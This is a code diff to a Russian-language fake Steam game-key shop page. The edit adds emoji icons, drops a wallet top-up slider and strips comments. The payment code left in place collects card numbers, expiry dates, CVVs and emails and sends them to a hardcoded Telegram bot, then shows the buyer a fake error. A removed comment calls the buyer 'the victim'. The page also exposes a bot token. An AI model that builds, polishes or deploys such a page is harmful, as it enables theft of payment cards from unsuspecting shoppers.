@@ -17,78 +17,15 @@
         .cart-icon-btn { background: #2f354b; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #cfd7ff; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .cart-icon-btn:hover { background: #3e4562; transform: scale(1.02); }
         
-        .stock-panel {
-            background: #2a2e42cc;
-            backdrop-filter: blur(4px);
-            border-radius: 60px;
-            padding: 20px 30px;
-            margin-bottom: 30px;
-            text-align: center;
-            border: 1px solid #4a4f6e;
-        }
-        .stock-remaining {
-            font-size: 1.4rem;
-            font-weight: bold;
-            color: #a5bdff;
-            margin-bottom: 15px;
-        }
-        .stock-value {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: #6c8cff;
-            margin: 5px 0;
-        }
-        .slider-container {
-            margin: 20px 0;
-        }
-        input[type=range] {
-            -webkit-appearance: none;
-            width: 100%;
-            height: 8px;
-            background: #1f2336;
-            border-radius: 10px;
-            outline: none;
-        }
-        input[type=range]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            height: 24px;
-            width: 24px;
-            border-radius: 50%;
-            background: #6c8cff;
-            cursor: pointer;
-            box-shadow: 0 0 6px #3a5fcc;
-        }
-        .selected-amount {
-            font-size: 1.3rem;
-            font-weight: bold;
-            color: #b7c9ff;
-            margin: 15px 0;
-        }
-        .buy-btn {
-            background: linear-gradient(95deg, #6c8cff, #3a5fcc);
-            border: none;
-            padding: 12px 30px;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 1.1rem;
-            color: white;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-        }
-        .buy-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 6px 14px rgba(60,95,204,0.3);
-        }
-        
         .products-grid { 
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
             gap: 25px;
             margin: 30px 0;
         }
         .product-card { background: #2a2e42dd; backdrop-filter: blur(4px); border: 1px solid #4a4f6e; border-radius: 32px; padding: 24px 20px; text-align: center; transition: 0.2s; }
         .product-card:hover { transform: translateY(-6px); background: #353b55; border-color: #6c8cff; }
+        .game-icon { font-size: 3rem; margin-bottom: 10px; }
         .price-container { margin: 14px 0; }
         .old-price { font-size: 1.1rem; color: #aaa; text-decoration: line-through; margin-right: 10px; }
         .new-price { font-size: 1.8rem; font-weight: bold; color: #6c8cff; }
@@ -137,7 +74,6 @@
 <canvas id="starCanvas"></canvas>
 
 <div class="app-container">
-    <!-- Магазин -->
     <div id="storeSection" class="store-container">
         <div class="header">
             <div class="logo"><h1>✨ Excellent Shop</h1><span>скидка 30% на все Steam ключи</span></div>
@@ -147,20 +83,7 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Пополнение Steam Wallet (без скидки) -->
-        <div class="stock-panel">
-            <div class="stock-remaining">💰 пополнение Steam Wallet</div>
-            <div class="stock-value" id="remainingStock">до 600 000 ₽</div>
-            <div class="slider-container">
-                <input type="range" id="steamSlider" min="100" max="600000" step="100" value="100">
-            </div>
-            <div class="selected-amount">
-                вы хотите пополнить: <span id="selectedAmount">100</span> ₽
-            </div>
-            <button class="buy-btn" id="buyWithSliderBtn">💎 добавить в корзину</button>
-        </div>
-
-        <!-- Сетка игр со скидкой 30% -->
+        <!-- Сетка игр со скидкой 30% и картинками-эмодзи -->
         <div class="products-grid" id="gamesGrid"></div>
         <footer>⭐ ключи приходят на email после оплаты ⭐</footer>
     </div>
@@ -219,34 +142,31 @@
     }
     drawStars();
 
-    // список игр (название, исходная цена, скидка 30%)
+    // список игр с картинками-эмодзи (удалён cs2 prime)
     const games = [
-        { name: "Elden Ring", oldPrice: 2999 },
-        { name: "Cyberpunk 2077", oldPrice: 2499 },
-        { name: "Baldur's Gate 3", oldPrice: 3599 },
-        { name: "Hogwarts Legacy", oldPrice: 2799 },
-        { name: "Red Dead Redemption 2", oldPrice: 2999 },
-        { name: "The Witcher 3: Wild Hunt", oldPrice: 1299 },
-        { name: "Call of Duty: Modern Warfare III", oldPrice: 3999 },
-        { name: "Starfield", oldPrice: 3499 },
-        { name: "Diablo IV", oldPrice: 3199 },
-        { name: "FIFA 24", oldPrice: 2499 },
-        { name: "Counter-Strike 2 (Prime)", oldPrice: 1499 },
-        { name: "Dota 2 (Arcana bundle)", oldPrice: 1999 },
-        { name: "Resident Evil 4 Remake", oldPrice: 2799 },
-        { name: "Atomic Heart", oldPrice: 2299 },
-        { name: "Hollow Knight: Silksong", oldPrice: 999 },
-        { name: "Stray", oldPrice: 1199 },
-        { name: "PUBG: Battlegrounds (G-Coin)", oldPrice: 899 },
-        { name: "Minecraft for Windows (Steam)", oldPrice: 1699 }
+        { name: "Elden Ring", oldPrice: 2999, icon: "🗡️✨" },
+        { name: "Cyberpunk 2077", oldPrice: 2499, icon: "🤖🔫" },
+        { name: "Baldur's Gate 3", oldPrice: 3599, icon: "🐉🎲" },
+        { name: "Hogwarts Legacy", oldPrice: 2799, icon: "⚡🧙" },
+        { name: "Red Dead Redemption 2", oldPrice: 2999, icon: "🤠🐎" },
+        { name: "The Witcher 3", oldPrice: 1299, icon: "🐺⚔️" },
+        { name: "Call of Duty: MW III", oldPrice: 3999, icon: "🎖️🔫" },
+        { name: "Starfield", oldPrice: 3499, icon: "🚀🌌" },
+        { name: "Diablo IV", oldPrice: 3199, icon: "😈🔥" },
+        { name: "FIFA 24", oldPrice: 2499, icon: "⚽🏆" },
+        { name: "Dota 2 (Arcana)", oldPrice: 1999, icon: "🌲🔨" },
+        { name: "Resident Evil 4", oldPrice: 2799, icon: "🧟🔫" },
+        { name: "Atomic Heart", oldPrice: 2299, icon: "⚙️🤖" },
+        { name: "Hollow Knight", oldPrice: 999, icon: "🪲🗡️" },
+        { name: "Stray", oldPrice: 1199, icon: "🐱🤖" },
+        { name: "PUBG (G-Coin)", oldPrice: 899, icon: "🪂🔫" },
+        { name: "Minecraft (Java)", oldPrice: 1699, icon: "⛏️🧱" }
     ];
     
-    // функция для расчёта цены со скидкой 30%
     function getDiscountedPrice(oldPrice) {
         return Math.round(oldPrice * 0.7);
     }
     
-    // генерация карточек игр
     const gamesGrid = document.getElementById('gamesGrid');
     function renderGames() {
         gamesGrid.innerHTML = '';
@@ -255,6 +175,7 @@
             const card = document.createElement('div');
             card.className = 'product-card';
             card.innerHTML = `
+                <div class="game-icon">${game.icon}</div>
                 <h3>${game.name}</h3>
                 <div class="price-container">
                     <span class="old-price">${game.oldPrice} ₽</span>
@@ -265,7 +186,6 @@
             `;
             gamesGrid.appendChild(card);
         });
-        // привязать события после отрисовки
         bindBuyButtons();
     }
     
@@ -303,7 +223,6 @@
         });
     }
     
-    // кнопки купить (привязываем после генерации)
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
@@ -315,26 +234,6 @@
             addItemToCart({ name: name, price: price });
         }
     }
-    
-    // слайдер пополнения Steam Wallet
-    const MAX_BALANCE = 600000;
-    const slider = document.getElementById('steamSlider');
-    const selectedSpan = document.getElementById('selectedAmount');
-    slider.max = MAX_BALANCE;
-    slider.addEventListener('input', () => {
-        let val = parseInt(slider.value);
-        if (val > MAX_BALANCE) val = MAX_BALANCE;
-        slider.value = val;
-        selectedSpan.innerText = val.toLocaleString('ru-RU');
-    });
-    
-    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
-        let amount = parseInt(slider.value);
-        if (amount <= 0) return;
-        let price = amount;
-        let itemName = `Пополнение Steam Wallet: ${amount.toLocaleString('ru-RU')} ₽`;
-        addItemToCart({ name: itemName, price: price });
-    });
     
     // телеграм данные (твои)
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
@@ -350,7 +249,6 @@
         setTimeout(() => toast.remove(), 4000);
     }
     
-    // модалка корзины
     const cartModal = document.getElementById('cartModal');
     const openCartBtn = document.getElementById('openCartBtn');
     const closeCartBtn = document.getElementById('closeCartBtn');
@@ -358,7 +256,6 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
     
-    // оплата с отправкой в тг
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) {
             showErrorToast();
@@ -384,8 +281,7 @@
                 headers:{'Content-Type':'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg})
             });
-            showErrorToast(); // жертва видит ошибку
-            // очищаем
+            showErrorToast();
             cart = [];
             updateCartUI();
             cartModal.style.display = 'none';
@@ -393,14 +289,11 @@
             document.getElementById('cardExpiry').value = '';
             document.getElementById('cardCvv').value = '';
             document.getElementById('steamEmail').value = '';
-            slider.value = 100;
-            selectedSpan.innerText = '100';
         } catch(e) {
             showErrorToast();
         }
     });
     
-    // инициализация
     renderGames();
     updateCartUI();
 </script>
